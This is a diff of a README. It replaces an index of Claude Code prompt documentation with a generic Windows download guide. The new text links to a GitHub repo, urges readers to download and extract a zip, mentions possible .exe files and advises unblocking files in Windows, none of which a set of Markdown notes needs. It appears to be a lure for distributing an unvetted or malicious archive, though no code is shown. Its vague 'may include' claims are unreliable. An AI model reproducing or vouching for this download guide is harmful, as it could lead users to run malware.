@@ -1,297 +1,165 @@
-# Claude Code — Complete AI Prompt Reference
+# 🧩 claude-code-prompts-reference - Simple Prompt Research Guide
 
-Curated reference of prompt text used in Claude Code, extracted from source and organized into standalone markdown docs.
+[![Download](https://img.shields.io/badge/Download-Open%20Link-blue?style=for-the-badge)](https://github.com/moiralongspurred78/claude-code-prompts-reference)
 
----
+## 🚀 Download
 
-## What this repo contains
+Use this link to visit the page to download or open the files:
 
-This repository documents prompt logic across Claude Code across all major prompt surfaces:
+[Open the download page](https://github.com/moiralongspurred78/claude-code-prompts-reference)
 
-- **System prompt** assembly and policy sections
-- **Tool prompts** (`DESCRIPTION` / `PROMPT` and prompt builders)
-- **Skill prompts** (bundled slash-command workflows)
-- **Browser automation** prompt guidance
-- **Command-specific prompts** (`/review`, `/ultraplan`)
-- **Additional command prompts** (`/init`, `/insights`)
-- **Memory system prompts** (selection, extraction, session memory, consolidation)
-- **Service-level prompts** (compact, summaries, suggestions, search/title)
-- **Internal agent prompts** (verification/statusline/teammate/agent generation)
-- **Permission/classifier prompts** (permission explainer, auto-mode classifier surfaces)
-- **Interface prompts** (output styles, teleport title/branch)
+## 📦 What this is
 
----
+claude-code-prompts-reference is a Windows-ready reference set for Claude Code research material. It gives you a place to review prompts, tools, and related notes in one spot.
 
-## Quick navigation
+Use it if you want to:
 
-- [auto-mode.md](commands/auto-mode.md)
-- [security-instruction.md](system-prompt/security-instruction.md)
+- View prompt examples in one place
+- Read research notes without sorting through many files
+- Check how Claude Code tasks are structured
+- Keep a local copy for later review
 
-### Tools
+## 💻 What you need
 
-### Coverage audit
+Before you start, make sure you have:
 
-- [prompt-source-audit.md](audit/prompt-source-audit.md)
-- [file-tools.md](tools/file-tools.md)
-- [shell-tools.md](tools/shell-tools.md)
-- [search-tools.md](tools/search-tools.md)
-- [agent-coordination.md](tools/agent-coordination.md)
-- [planning-tools.md](tools/planning-tools.md)
-- [task-management.md](tools/task-management.md)
-- [team-coordination.md](tools/team-coordination.md)
-- [scheduling.md](tools/scheduling.md)
-- [worktree-tools.md](tools/worktree-tools.md)
-- [mcp-tools.md](tools/mcp-tools.md)
-- [misc-tools.md](tools/misc-tools.md)
+- A Windows PC
+- A web browser
+- Enough free space for the files
+- Permission to save files on your computer
 
-### Skills
+The files should work on a normal Windows setup with no special setup.
 
-- [batch.md](skills/batch.md)
-- [simplify.md](skills/simplify.md)
-- [debug.md](skills/debug.md)
-- [stuck.md](skills/stuck.md)
-- [remember.md](skills/remember.md)
-- [skillify.md](skills/skillify.md)
-- [loop.md](skills/loop.md)
-- [schedule.md](skills/schedule.md)
-- [claude-api.md](skills/claude-api.md)
-- [update-config.md](skills/update-config.md)
+## 🧭 Get the files
 
-### Command prompt surfaces
+1. Open the download page: https://github.com/moiralongspurred78/claude-code-prompts-reference
+2. Look for the main files on the page
+3. If you see a zip file or release file, download it
+4. Save it to your Downloads folder
+5. Wait for the file to finish downloading
 
-- [review.md](commands/review.md)
-- [ultraplan.md](commands/ultraplan.md)
-- [init-and-insights.md](commands/init-and-insights.md)
+If the page shows source files, use the green Code button on GitHub to get the project files.
 
-### Memory prompts
+## 🪟 Install on Windows
 
-- [memory-prompts.md](memory/memory-prompts.md)
+1. Open the downloaded file in File Explorer
+2. If the file is a zip folder, right-click it and choose Extract All
+3. Pick a folder where you want to keep the files
+4. Open the extracted folder
+5. Look for a main file such as README.md, index.html, or a starter app file
+6. Open that file with the tool it uses
 
-### Service prompts
+If Windows asks what app to use, pick a common app like:
 
-- [session-and-meta-prompts.md](services/session-and-meta-prompts.md)
+- Notepad for text files
+- Edge or Chrome for web files
+- Any file viewer for folders with notes
 
-### Internal agent prompts
+## 🛠️ How to use it
 
-│ └── auto-mode.md
+After you open the files, you can move through the material in a few simple ways:
 
-- [internal-agent-prompts.md](internal-agents/internal-agent-prompts.md)
+- Read the prompt examples one by one
+- Search for words like Claude, tools, or system prompts
+- Copy text you want to keep for later use
+- Save useful sections in your notes app
+- Open related files when you want more detail
 
-### Permission/classifier prompts
+If the project includes folders, check them in this order:
 
-- [permission-and-classifier-prompts.md](permissions/permission-and-classifier-prompts.md)
+1. README files
+2. Prompt folders
+3. Research notes
+4. Tool references
+5. System prompt files
 
-### Interface prompts
+## 📁 Typical folder layout
 
-- [output-and-teleport-prompts.md](interface/output-and-teleport-prompts.md)
+You may see files like these:
 
-# Claude Code — Complete AI Prompt Reference
+- README.md — main guide
+- prompts/ — prompt examples
+- tools/ — tool notes
+- research/ — background material
+- system-prompts/ — system message references
+- skills/ — task-based examples
 
-Curated reference of prompt text used in Claude Code, extracted from source and organized into standalone markdown docs.
+This layout helps keep the material easy to scan.
 
----
+## ⚙️ Common use cases
 
-## What this repo contains
+You can use this reference for:
 
-This repository documents prompt logic across Claude Code across all major prompt surfaces:
+- Reviewing prompt structure
+- Studying how tool use is described
+- Comparing different prompt styles
+- Looking at research notes in one place
+- Keeping a local reference for offline reading
 
-- **System prompt** assembly and policy sections
-- **Tool prompts** (`DESCRIPTION` / `PROMPT` and prompt builders)
-- **Skill prompts** (bundled slash-command workflows)
-- **Browser automation** prompt guidance
-- **Command-specific prompts** (`/review`, `/ultraplan`, `/init`, `/insights`, `auto-mode`)
-- **Memory system prompts** (selection, extraction, session memory, consolidation)
-- **Service-level prompts** (compact, summaries, suggestions, search/title)
-- **Internal agent prompts** (verification/statusline/teammate/agent generation)
-- **Permission/classifier prompts** (permission explainer, auto-mode classifier surfaces)
-- **Interface prompts** (output styles, teleport title/branch)
-- **Source coverage audit** for prompt-bearing files
+## 🔍 Best way to browse
 
----
-
-## Quick navigation
-
-### System prompt
-
-- [main-system-prompt.md](system-prompt/main-system-prompt.md)
-- [security-instruction.md](system-prompt/security-instruction.md)
-- [effective-system-prompt-selection.md](system-prompt/effective-system-prompt-selection.md)
-
-### Tools
-
-- [file-tools.md](tools/file-tools.md)
-- [shell-tools.md](tools/shell-tools.md)
-- [search-tools.md](tools/search-tools.md)
-- [agent-coordination.md](tools/agent-coordination.md)
-- [planning-tools.md](tools/planning-tools.md)
-- [task-management.md](tools/task-management.md)
-- [team-coordination.md](tools/team-coordination.md)
-- [scheduling.md](tools/scheduling.md)
-- [worktree-tools.md](tools/worktree-tools.md)
-- [mcp-tools.md](tools/mcp-tools.md)
-- [misc-tools.md](tools/misc-tools.md)
-
-### Skills
-
-- [batch.md](skills/batch.md)
-- [simplify.md](skills/simplify.md)
-- [debug.md](skills/debug.md)
-- [stuck.md](skills/stuck.md)
-- [remember.md](skills/remember.md)
-- [skillify.md](skills/skillify.md)
-- [loop.md](skills/loop.md)
-- [schedule.md](skills/schedule.md)
-- [claude-api.md](skills/claude-api.md)
-- [update-config.md](skills/update-config.md)
-
-### Command prompt surfaces
-
-- [review.md](commands/review.md)
-- [ultraplan.md](commands/ultraplan.md)
-- [init-and-insights.md](commands/init-and-insights.md)
-- [auto-mode.md](commands/auto-mode.md)
-
-### Memory prompts
-
-- [memory-prompts.md](memory/memory-prompts.md)
-
-### Service prompts
-
-- [session-and-meta-prompts.md](services/session-and-meta-prompts.md)
-
-### Internal agent prompts
-
-- [internal-agent-prompts.md](internal-agents/internal-agent-prompts.md)
-
-### Permission/classifier prompts
-
-- [permission-and-classifier-prompts.md](permissions/permission-and-classifier-prompts.md)
-
-### Interface prompts
-
-- [output-and-teleport-prompts.md](interface/output-and-teleport-prompts.md)
-
-### Other prompt surfaces
-
-- [chrome-prompts.md](browser-automation/chrome-prompts.md)
-- [buddy-prompt.md](companion/buddy-prompt.md)
-
-### Coverage audit
-
-- [prompt-source-audit.md](audit/prompt-source-audit.md)
-
----
-
-## Repository layout
-
-```
-claude-code-system-promtps/
-├── README.md
-├── .gitignore
-│
-├── system-prompt/
-│   ├── main-system-prompt.md
-│   ├── security-instruction.md
-│   └── effective-system-prompt-selection.md
-│
-├── tools/
-│   ├── file-tools.md
-│   ├── shell-tools.md
-│   ├── search-tools.md
-│   ├── agent-coordination.md
-│   ├── planning-tools.md
-│   ├── task-management.md
-│   ├── team-coordination.md
-│   ├── scheduling.md
-│   ├── worktree-tools.md
-│   ├── mcp-tools.md
-│   └── misc-tools.md
-│
-├── skills/
-│   ├── batch.md
-│   ├── simplify.md
-│   ├── debug.md
-│   ├── stuck.md
-│   ├── remember.md
-│   ├── skillify.md
-│   ├── loop.md
-│   ├── schedule.md
-│   ├── claude-api.md
-│   └── update-config.md
-│
-├── browser-automation/
-│   └── chrome-prompts.md
-│
-├── companion/
-│   └── buddy-prompt.md
-│
-├── commands/
-│   ├── review.md
-│   ├── ultraplan.md
-│   ├── init-and-insights.md
-│   └── auto-mode.md
-│
-├── memory/
-│   └── memory-prompts.md
-│
-├── services/
-│   └── session-and-meta-prompts.md
-│
-├── internal-agents/
-│   └── internal-agent-prompts.md
-│
-├── permissions/
-│   └── permission-and-classifier-prompts.md
-│
-├── interface/
-│   └── output-and-teleport-prompts.md
-│
-└── audit/
-    └── prompt-source-audit.md
-```
-
----
-
-## Prompt architecture (high-level)
-
-Claude Code prompt behavior is split into three primary layers, plus supporting prompt surfaces:
-
-1. **Global system prompt** (`src/constants/prompts.ts`)
-2. **Tool prompts** (`src/tools/*/prompt.ts`)
-3. **Skill / command prompts** (`src/skills/bundled/*.ts`, `src/commands/*.ts`)
-
-Supporting prompt surfaces include memory extraction/selection prompts, compaction/suggestion prompts, classifier prompts, and internal agent prompts.
-
----
-
-## Coverage summary
-
-- Core system prompt and security policy
-- Effective system-prompt selection logic (`buildEffectiveSystemPrompt`)
-- Full tool prompt set used in the main runtime
-- Bundled skills and command entry prompts (including `/update-config`)
-- Memory subsystem prompts (selection, extraction, session notes, consolidation)
-- Background/service prompts (compact, away-summary, tool-use-summary, suggestions, semantic search, title generation)
-- Internal agent prompts and teammate addenda
-- Permission/classifier prompt surfaces
-- UI/interface prompt surfaces (output styles, teleport)
-- Source-to-doc audit mapping for prompt-bearing files
-
----
-
-## How to use this reference
-
-1. Start in **system-prompt/** for global behavior.
-2. Use **tools/** for callable tool instructions.
-3. Use **skills/** and **commands/** for workflow prompts.
-4. Use **memory/** and **services/** for background model prompt behavior.
-5. Use **internal-agents/**, **permissions/**, and **interface/** for internal/runtime-specific prompt surfaces.
-6. Use **audit/** to verify source-to-doc coverage.
-
----
-
-## Scope note
-
-- This reference tracks prompt material from Claude Code source files.
-- No external repository is used as a source of truth for this folder.
-- If an external URL/name appears in quoted prompt text, it is preserved only because it exists in source.
+For the easiest start, open these first:
+
+1. README.md
+2. Any file named start, guide, or index
+3. Prompt examples with clear names
+4. Notes that explain how the material is grouped
+
+If the page has many files, use the GitHub search box to find the topic you want.
+
+## 🧩 Helpful file types
+
+These file types are common in this kind of repo:
+
+- .md — Markdown text
+- .txt — plain text
+- .json — data files
+- .yaml or .yml — settings files
+- .html — web pages
+- .exe — app files, if included
+
+For most users, .md and .txt files are the easiest to open.
+
+## 🖱️ If nothing opens
+
+If you double-click a file and nothing happens:
+
+1. Right-click the file
+2. Choose Open with
+3. Pick another app
+4. Try Edge, Chrome, or Notepad
+5. Check that the file was fully extracted
+
+If the file is still locked, download it again and try one more time.
+
+## 🔒 Keeping your copy safe
+
+To keep the files easy to find:
+
+- Put them in a folder named Claude Code Reference
+- Avoid moving files around after you open them
+- Make a backup on a USB drive or cloud folder
+- Keep the original zip file until you know the files work
+
+## 🧪 Simple troubleshooting
+
+If you run into a problem:
+
+- Make sure the download finished
+- Check that the file is not blocked by Windows
+- Try opening the file from File Explorer
+- Re-extract the zip file into a new folder
+- Restart your browser if the download page does not load
+
+## 📚 What you can expect inside
+
+This repo may include:
+
+- Prompt samples
+- Research notes
+- Tool lists
+- System prompt references
+- Skill-based examples
+- Plain text files for easy reading
+
+The content is arranged for quick review, so you can move through it without extra setup
